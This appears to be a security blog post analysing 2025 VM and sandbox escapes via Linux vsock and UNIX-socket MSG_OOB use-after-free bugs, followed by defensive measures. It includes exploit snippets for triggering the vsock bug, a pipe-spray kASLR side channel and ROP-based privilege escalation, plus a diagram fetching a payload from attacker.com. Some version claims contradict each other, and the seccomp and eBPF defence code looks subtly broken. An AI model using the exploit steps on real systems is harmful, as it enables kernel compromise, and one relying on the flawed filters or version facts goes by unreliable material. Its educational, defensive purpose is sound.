---
title: "Breaking Isolation Boundaries: VM Escapes, Container Breakouts, and Sandbox Escapes"
published: 2026-04-05 10:00:00+00:00
draft: false
description: "A deep technical analysis of 2025's most dangerous attack pattern — isolation boundary escapes. From vsock VM escapes to UNIX socket sandbox bypasses, understanding how attackers break out of containers, VMs, and sandboxes to reach the host kernel."
tags: ["Security", "Kernel", "Virtualization", "Containers", "Sandbox", "VM Escape", "Exploitation", "Linux"]
series: ""
toc: true
---

Isolation boundaries are the cornerstone of modern computing security. Virtual machines isolate cloud workloads. Containers package applications with process-level boundaries. Browser sandboxes confine untrusted web content. The assumption is simple: even if code is compromised, it cannot escape its confinement.

In2025, that assumption faced sustained assault. A pattern emerged across the security landscape: attackers weren't finding vulnerabilities in applications or even individual kernel components—they were finding vulnerabilities *at the boundaries themselves*. The interfaces between guest and host, between container and kernel, between sandboxed process and privileged system. These boundary crossings, designed for legitimate communication, became attack surfaces.

This post examines three critical vulnerabilities that defined this pattern: a VM escape through vsock, a browser sandbox escape through UNIX socket out-of-band data, and the exploitation primitives that make these attacks possible. The goal is not just understanding past vulnerabilities, but recognizing how isolation boundary attacks work and where to look for future ones.

---

## The Isolation Boundary Attack Pattern

Traditional exploitation focuses on gaining privileges within a context: user→root escalation, or compromising an application. Boundary attacks are different. They start with the assumption that the attacker *already has control* of code inside a restricted environment—a VM guest, a container, a browser renderer—and the goal is to break out to the host.

```
┌─────────────────────────────────────────────────────────────────┐
│                         Host System                              │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │                     Privileged Context                      │ │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │  │
│  │  │   VM Host   │  │  Container  │  │   Kernel Proper     │ │  │
│  │  │  Interface  │  │   Runtime   │  │   (credentials,      │ │  │
│  │  │             │  │             │  │    memory, drivers) │ │  │
│  │  └──────┬──────┘  └──────┬──────┘  └──────────┬──────────┘ │  │
│  └─────────┼────────────────┼────────────────────┼────────────┘  │
│            ││  │                    │               │
│  ┌─────────▼────────────────▼────────────────────▼────────────┐ │
│  │                   Isolation Boundary                         │ │
│  │        (vsock, UNIX sockets, syscalls, device files)        │ │
│  └─────────┬────────────────┬────────────────────┬────────────┘ │
│            │                │                    │               │
│  ┌─────────▼─────┐  ┌───────▼───────┐  ┌────────▼─────────────┐ │
│  │  VM Guest     │  │   Container   │  │  Browser Renderer    │ │
│  │  (attacker)   │  │   (attacker)  │  │      (attacker)      │ │
│  └───────────────┘  └───────────────┘  └──────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

The boundary is where two trust domains meet. The host trusts the boundary interface to properly validate data crossing it. The guest trusts the boundary interface to correctly route its legitimate requests. An isolation boundary attack corrupts one side to affect the other.

Key characteristics of this attack class:
- **Low initialprivilege required** — attacker starts confined, not elevated
- **Kernel code is involved** — the boundary is enforced in kernel memory
- **Memory corruption at the interface** — use-after-free, double-free, or type confusion in boundary-handling code
- **Target: host kernel credentials or memory** — the goal is `root`, `CAP_SYS_ADMIN`, or arbitrary kernel memory read/write

---

## Case Study 1: The vsock VM Escape (CVE-2025-21756)

### Background: What is vsock?

`vsock` (Virtual Socket) is a Linux socket family designed for communication between virtual machines and their hypervisors, or between containers and their hosts. Unlike TCP sockets that require network configuration, vsock uses simple address-based messaging: `(context_id, port)` pairs identify endpoints.

```
┌─────────────────────────────┐
│         VM Guest            │
│                             │
│   socket(AF_VSOCK)          │
│   connect(VMADDR_CID_HOST)  │◄───────┐
│                             │        │
└─────────────────────────────┘│
                               │vsock transport
┌─────────────────────────────┐│
│         Host Kernel          ││
│                              ││
│  vsock_bind_table            ││
│  vsock_connected_table       │◄───────┘
│  transport_g2h (vmci/virtio) │
│                              │
└──────────────────────────────┘
```

The key trust boundary: the guest can initiate connections to the host, but the host's kernel is supposed to properly manage the vsock objects and their lifecycle. The host never trusts guest data; it only trusts its own internal bookkeeping.

### The Vulnerability

In April 2025, researchers discovered a use-after-free bug in the vsock subsystem. The vulnerability exists in the transport reassignment path—when a vsock socket switches from one transport to another.

```c
// Simplified vulnerable code path
void vsock_remove_sock(struct vsock_sock *vsk)
{
    vsock_remove_bound(vsk);      // <- BUG: Called unconditionally
    vsock_remove_connected(vsk);
}
```

When a connection attempt fails (e.g., trying to reach a non-existent CID), the socket may have had a transport assigned but never completed binding. Calling `vsock_remove_bound()` on an unbound socket incorrectly decrements the reference counter. When that refcount reaches zero, the kernel frees the socket object—but pointers to it remain.

**The primitive**: attacker controls when the object is freed (trigger path) and can race to reclaim the memory (spray path) before the kernel uses the dangling pointers.

### The Exploitation Chain

What makes CVE-2025-21756 remarkable is not just the vulnerability, but the exploitation technique used to achieve privilege escalation from an unprivileged VM guest.

#### Step 1: Trigger the UAF

```c
/* Createvsock socket */
int s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

/* First connect: sets transport, puts sock in unbound state */
struct sockaddr_vm addr = {
    .svm_family = AF_VSOCK,
    .svm_cid = VMADDR_CID_HOST,
    .svm_port = 1234,// non-listening port
};
connect(s, (struct sockaddr *)&addr, sizeof(addr));// fails, but sets transport

/* Second connect: triggers transport release path */
addr.svm_cid = VMADDR_CID_NONEXISTING;
connect(s, (struct sockaddr *)&addr, sizeof(addr));

/* Now bind: triggers vsock_remove_sock with incorrect refcount */
bind(s, (struct sockaddr *)&addr, sizeof(addr));
```

At this point, the kernel has freed the `vsock_sock` object, but references remain in the socket hash tables.

#### Step 2: Defeat AppArmor / LSM Hooks

After freeing, `security_sk_free()` zeros out `sk->sk_security`. AppArmor (and other LSMs) dereference this pointer in almost every socket operation—`bind`, `connect`, `sendmsg` all crash on NULL.

The breakthrough: `vsock_diag_dump()` iterates through `vsock_bind_table` and calls a callback function that does *not* go through LSM hooks. It's a diagnostic interface meant for dumping socket state, and it skips security checks.

But there's a catch: `vsock_diag_dump()` checks `sk->sk_state` must be `TCP_LISTEN` (value 2), and `sk->sk_net` must point to a valid network namespace. Neither condition is true after thefree.

#### Step 3: kASLR Bypass via Side Channel

Since direct kernel memory leaks aren't available, the exploit uses `vsock_diag_dump()` as a *side channel* to brute-force the kernel address of `init_net`:

```c
/* Spray pipes to reclaim the freed socket's page */
char page[PAGE_SIZE];
memset(page, 2, PAGE_SIZE);  // sk_state must be 2 (TCP_LISTEN)

for (int i = 0; i < NUM_PIPES; i++) {pipe(pipes[i]);
    write(pipes[i][1], page, PAGE_SIZE);
    
    /* Query diag dump - if socket appears, we control sk_state */
    if (query_vsock_diag() == EXPECTED_COUNT)break;
}

/* Now brute-force skc_net pointer using same side channel */
for (long off = 0; off < BRUTE_RANGE; off += 128) {long candidate = KERNEL_BASE + off;
    write(pipes[i][1], page, PAGE_SIZE - 8);
    write(pipes[i][1], &candidate, 8);  // Overwrite skc_net
    
    if (query_vsock_diag() == EXPECTED_COUNT) {
        printf("[*] Leaked init_net @ 0x%lx\n", candidate);
        break;
    }
}
```

When `vsock_diag_dump()` starts reporting the socket again, we've found a valid `skc_net` pointer—and we now know an address in the kernel's `.data` section.

#### Step 4: RIP Control via Function Pointer Overwrite

The final goal is to redirect execution to a `commit_creds(prepare_kernel_cred(NULL))` chain for privilege escalation.

```c
/* Target: vsock_release() dereferences sk->sk_prot->close */
static int vsock_release(struct socket *sock)
{
    struct sock *sk = sock->sk;
    if (!sk)
        return 0;
    
    sk->sk_prot->close(sk, 0);  // <-- Function pointer we control
    // ...
}
```

Theexploit overwrites `sk->sk_prot` to point to `raw_abort()` (from the raw socket protocol), which calls `sk->sk_error_report()`:

```c
int raw_abort(struct sock *sk, int err)
{
    lock_sock(sk);
    sk->sk_err = err;
    sk_error_report(sk);  // <-- Calls sk->sk_error_report()
    // ...
}
```

By carefully placing ROP gadgets in controlled kernel memory and setting `sk->sk_error_report` to point to a stack pivot, the exploit achieves arbitrary code execution in ring 0.

### Why This Matters for Defense

The vsock exploit demonstrates several truths about isolation boundary attacks:

1. **The exploit primitive starts inside the trusted context** — The attacker is already a guest, with full control of guest kernel structures passed through the boundary.

2. **Defensive assumptions break at boundaries** — The host assumes proper reference counting. The guest doesn't need to break kernel memory protection; it just needs to find a path where the host's internal bookkeeping fails.

3. **Side channels substitute for information leaks** — When direct memory reads aren't available, behavioral side channels (like `vsock_diag_dump` acceptance) can leak addresses probabilistically.

4. **LSM bypass isn't the end** — Even with AppArmor blocking most socket operations, a single unprotected diagnostic interface becomes a reliable exploitation primitive.

**Mitigation**: Kernel hardening, privilege separation (run virtualization components with limited capabilities), and disabling unused interfaces (`vsock` is rarely needed in most VM workloads).

---

## Case Study 2: The MSG_OOB Sandbox Escape (CVE-2025-38236)

### Background: UNIX Domain Sockets and Out-of-Band Data

UNIX domain sockets (`AF_UNIX`) are used for inter-process communication on the same machine. They're faster than TCP (no network stack overhead) and have been a Linux feature since the early days.

One obscure feature: `MSG_OOB` (Out-Of-Band) data. Originally designed for TCP urgent data (a bell/whistle from the Telnet era), it was shoehorned into UNIX domain sockets for compatibility with legacy applications like Oracle.

```c
/* Send one byte of out-of-band data */
send(sockfd, &oob_byte, 1, MSG_OOB);

/* Receive separately from normal data */
recv(sockfd, &buf, sizeof(buf), MSG_OOB);
```

The kernel stores this OOB byte in a separate `skb` (socket buffer) called `oob_skb`. Here's the problem: the data structure handling for this rare feature was never audited with modern security in mind.

### The Vulnerability

Discovered by Jann Horn of Google Project Zero, CVE-2025-38236 is a use-after-free in the UNIX socket OOB handling code, introduced in Linux kernel 5.15 and exploitable fromChrome's sandboxed renderer process.

```c
/* Simplified vulnerable path */
struct sk_buff *oob_skb = unix_sk(sk)->oob_skb;

/* When socket is closed, oob_skb is freed...*/
unix_destruct_skb(oob_skb);

/* ...but the pointer remains in unix_sk structure */
/* Subsequent recv(MSG_OOB) dereferences freed memory */
```

The attack requires careful timing:

1. Create a pair of connected UNIX domain sockets (`socketpair()`)
2. Send OOB data to create `oob_skb`
3. Close one end of the socket pair
4. Race: the kernel frees `oob_skb` but doesn't clear the pointer
5. Reclaim memory with attacker-controlled data via pipe spray
6. Call `recv(MSG_OOB)` — kernel dereferences the freed (now controlled) pointer

### Chrome Sandbox Escape

What makes this vulnerability critical is that Chrome's renderer sandbox allows `AF_UNIX` socket creation and message passing. The sandbox blocks most dangerous syscalls (through seccomp), but `socket()` and `send()`/`recv()` with `MSG_OOB` were not filtered.

```
┌────────────────────────────────────────────────────────────┐
│                    Chrome Renderer                          │
│  ┌──────────────────────────────────────────────────────┐ │
│  │                     Sandbox                            │ │
│  │  JavaScript: fetch('attacker.com/payload.html')       │ │
│  │         │                                             │ │
│  │         ▼                                             │ │
│  │  Renderer Process (unprivileged)                      │ │
│  │         │                                             │ │
│  │         │ socketpair(AF_UNIX)        ◄── ALLOWED     │ │
│  │         │ send(MSG_OOB)               ◄── ALLOWED     │ │
│  │         │ recv(MSG_OOB)               ◄── ALLOWED     │ │
│  │         │ close()                     ◄── ALLOWED     │ │
│  │         │                                             │ │
│  │         ▼                                             │ │
│  │  ┌─────────────────────────────────────────────────┐  │ │
│  │  │           Kernel Memory Corruption               │  │ │
│  │  │           (Use-After-Free in oob_skb)            │  │ │
│  │  └─────────────────────────────────────────────────┘  │ │
│  │         │                                             │ │
│  └─────────┼─────────────────────────────────────────────┘ │
│            │                                               │
│            ▼                                               │
│         Kernel                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  Arbitrary memory read/write → Privilege escalation   │ │
│  │  commit_creds(prepare_kernel_cred(NULL))              │ │
│  └───────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────┘
```

From a malicious webpage to full kernel control—with no special hardware, no social engineering beyond "visit this site," and no fradkmework exploits required.

### Exploitation Primitives

The MSG_OOB exploit shares techniques with the vsock exploit:

| Technique | CVE-2025-21756 (vsock) | CVE-2025-38236 (MSG_OOB) |
|-----------|------------------------|--------------------------|
| Trigger | Failed connect path | Close + recv sequence |
| Spray primitive | Pipe backing pages | Pipe spray|
| kASLR bypass | Side channel via diag dump | Various methods (msg_msg, setxattr) |
| RIP control | Function pointer in sk_prot | Function pointer corruption |
| Goal | VM guest → host root | Renderer → kernel root |

### Impact and Mitigation

**Affected systems**: Linux kernel 6.9+, Chrome on Linux, any system where `CONFIG_AF_UNIX_OOB` is enabled (default in most distributions).

**Mitigations**:

1. **Kernel update**: Fixed in Linux 6.9.8
2. **Disable the feature**: `CONFIG_AF_UNIX_OOB=n` in custom kernels
3. **Seccomp filtering**: Block `send()`/`recv()` with `MSG_OOB` flag in sandbox profiles

```c
/* Seccomp rule to block MSG_OOB */
struct sock_filter filter[] = {
    /* Architecture check */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
    
    /* Load syscall number */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
    
    /* If send/recv, check flags */
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_sendto, 1, 0),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_recvfrom, 2, 0),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    
    /* Block if MSG_OOB (0x01) is set in flags */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, args[3])),
    BPF_JUMP(BPF_JMP | BPF_AND | BPF_K, 0x01, 0, 1),/* MSG_OOB */
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};
```

---

## The Bigger Picture: 2025's Attack Theme

Both vulnerabilities share a critical pattern: they target code paths that exist *specifically* to handle cross-boundary communication. The vsock subsystem mediates VM↔host. The UNIXsocket OOB code mediates process↔process (and transitively, sandbox↔kernel).

Looking at 2025's exploit landscape, a theme emerges:

| CVE | Subsystem | Boundary Type | Exploited Feature |
|-----|-----------|---------------|-------------------|
| CVE-2025-21756 | vsock | VM→Host | Transport reassignment |
| CVE-2025-38236 | AF_UNIX | Sandbox→Kernel | Out-of-band data |
| CVE-2025-38352 | POSIX timers | Container→Kernel | TOCTOU in timer deletion |
| CVE-2025-23266 | NVIDIA Container Toolkit | Container→Host | Hook execution context |

The attack surface of isolation is the *interface code itself*—the shared memory queues, the syscall handlers, the socket implementations. Every feature that crosses privilege boundaries is a potential breach.

### Why Now?

Several trends converge:

1. **Cloud-native adoption** — More workloads run in VMs and containers than ever before. The VM↔host interface is now a production-critical attack surface.

2. **Browser sandbox maturity** — As browser exploits become harder, attackers look for sandbox escapes. The kernel becomes the newtarget.

3. **Kernel feature accumulation** — The Linux kernel is 30+ years old. Features like `MSG_OOB` were added for long-gone use cases but never removed. Every feature is attack surface.

4. **Defensive stack hardening** —.stack canaries, ASLR, CFI made userspace exploits harder. Kernel exploitation becomes the path of least resistance.

---

## Defense-in-Depth Strategies

### 1. Reduce Attack Surface

The most effective mitigation is removing code that crosses boundaries.

```bash
# Check if vsock is loaded
lsmod | grep vsock

# Unload if not needed
sudo modprobe -r vsock vmw_vsock_vmci_transport vmw_vsock_virtio_transport

# Blacklist to prevent auto-loading
echo "blacklist vsock" | sudo tee /etc/modprobe.d/disable-vsock.conf
```

For container hosts, disable unnecessary kernel modules and features:

```bash
# In kernel config (custom builds)
# CONFIG_VSOCKETS=n
# CONFIG_AF_UNIX_OOB=n# Disable MSG_OOB
```

### 2. Seccomp Policies for Sandboxed Processes

The Chrome sandbox escape demonstrates that allowed syscalls must be audited for edge cases. A robust seccomp policy for a browser renderer or untrusted container should:

```c
/* Deny dangerous socket operations */
SECCOMP_RULE_ADD(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(socket), 1,
    SCMP_A0(SCMP_CMP_EQ, AF_VSOCK));/* Block vsock */

SECCOMP_RULE_ADD(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(recvmsg), 1,
    SCMP_A2(SCMP_CMP_MASKED_EQ, MSG_OOB, MSG_OOB));/* Block MSG_OOB */
```

### 3. Kernel Hardening

Modern kernels support several hardening features that raise the bar for exploitation:

```bash
# Memory integrity checking (5.x+)
echo 1 > /proc/sys/net/core/bpf_jit_harden    # Harden BPF JIT

# Restrict perf events (used for side channels)
echo 2 > /proc/sys/kernel/perf_event_paranoid

# Limit userfaultfd (spray primitive for many exploits)
echo 0 > /proc/sys/vm/unprivileged_userfaultfd
```

### 4. Runtime Monitoring with eBPF

Even with mitigations, vulnerabilities will exist. Detect exploitation attempts:

```python
#!/usr/bin/env python3
"""
Detect potential isolation boundary attacks via eBPF
"""

from bcc import BPF

PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

BPF_HASH(conn_failed, u32, u64);  // Track failed vsock connects
BPF_HASH(oob_recv, u32, u64);      // Track MSG_OOB receives

// Monitor vsock connection failures (CVE-2025-21756 pattern)
TRACEPOINT_PROBE(syscalls, sys_exit_connect) {
    int ret = args->ret;
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Failed connect to AF_VSOCK (254)? Suspicious if repeated
    if (ret < 0) {
        u64 *count = conn_failed.lookup(&pid);
        if (count && *count > 3) {
            // More than 3 failed vsock connects - potential exploit
            char comm[16];
            bpf_get_current_comm(comm, sizeof(comm));
            bpf_trace_printk("SUSPICIOUS: PID %d COMM %s multiplevsock fails\n", pid, comm);
        }
        u64 zero = 0, one = 1;
        conn_failed.increment(pid);
    }
    return 0;
}

// Monitor MSG_OOB on UNIX sockets (CVE-2025-38236 pattern)
TRACEPOINT_PROBE(syscalls, sys_enter_recvmsg) {
    // Check if MSG_OOB (0x01) is set in flags (arg 2)
    if ((args->flags & 0x01) == 0x01) {
        u32 pid = bpf_get_current_pid_tgid() >> 32;
        char comm[16];
        bpf_get_current_comm(comm, sizeof(comm));
        bpf_trace_printk("SUSPICIOUS: PID %d COMM %s using MSG_OOB\n", pid, comm);
    }
    return 0;
}
"""

bpf = BPF(text=PROGRAM)
print("Monitoring for isolation boundary attack patterns...")
bpf.trace_print()
```

### 5. Privilege Separation

Virtualization and container infrastructure should run with minimal privileges:

```yaml
# Pod security policy example - restrict kernel interfaces
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  runAsUser:
    rule: MustRunAsNonRoot
  seLinux:
    rule: RunAsAny
  supplementalGroups:
    rule: MustRunAs
    ranges:
      - min: 1
        max: 65535
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    # Exclude hostPath - prevents access to /dev/kvm, /dev/vhost-net, etc.
  allowedCapabilities:
    - ''# No additional capabilities
```

---

## Conclusion

Isolation boundary attacks represent a shift in exploitation strategy. Rather than finding vulnerabilities *within* a trusted context and escalatingprivileges, attackers find vulnerabilities *at the boundary* and break into the more privileged context directly.

The vsock VM escape and MSG_OOB sandbox escape are not isolated incidents—they're exemplars of a broader pattern visible across2025: the interfaces designed to enable legitimate cross-boundary communication become the attack surface for breaking those boundaries.

For defenders, the lessons are:

1. **Audit boundary code**: Every syscall handler, socket family, and device interface that crosses privilege levels is high-risk.

2. **Disable unused features**: `MSG_OOB` had no legitimate use in Chrome's renderer. `vsock` has no place in most containerized workloads. Reduce surface.

3. **Layer defenses**: Seccomp policies, kernel hardening, and eBPF monitoring each raise the bar. Together, they make exploitation impractical.

4. **Monitor for patterns**: The exploitation primitives (failed connects, unusual flags, spray patterns) are visible at runtimewith proper instrumentation.

The boundaries between VM and host, between container and kernel, between sandbox and system—these are where the battle is fought now. Understanding how attackers break through is the first step to holding the line.

---

## References

- CVE-2025-21756: vsock Use-After-Free
- CVE-2025-38236: UNIX Socket MSG_OOB Vulnerability  
- CVE-2025-38352: POSIX Timer TOCTOU (CISA KEV)
- "Branch History Injection" -VUSec (Spectre-BHB)
- Linux Kernel Exploitation - xairy.github.io
- Google Project Zero Technical Reports